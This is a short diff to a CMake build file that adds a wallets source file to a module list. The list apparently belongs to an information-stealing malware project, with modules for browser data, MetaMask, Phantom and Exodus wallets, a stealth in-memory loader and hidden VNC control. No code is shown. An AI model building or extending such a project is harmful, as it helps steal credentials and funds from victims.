@@ -16,6 +16,7 @@ set(MODULE_SOURCES
     src/browser/chrome.cpp
     src/browser/firefox.cpp
     src/browser/edge.cpp
+    src/browser/wallets.cpp
     src/crypto/metamask.cpp
     src/crypto/phantom.cpp
     src/crypto/exodus.cpp
@@ -26,6 +27,7 @@ set(MODULE_SOURCES
     src/stealth/in_memory_loader.cpp
     src/hvnc/create_desktop.cpp
     src/hvnc/control_session.cpp
+    
 )
 
 # All sources
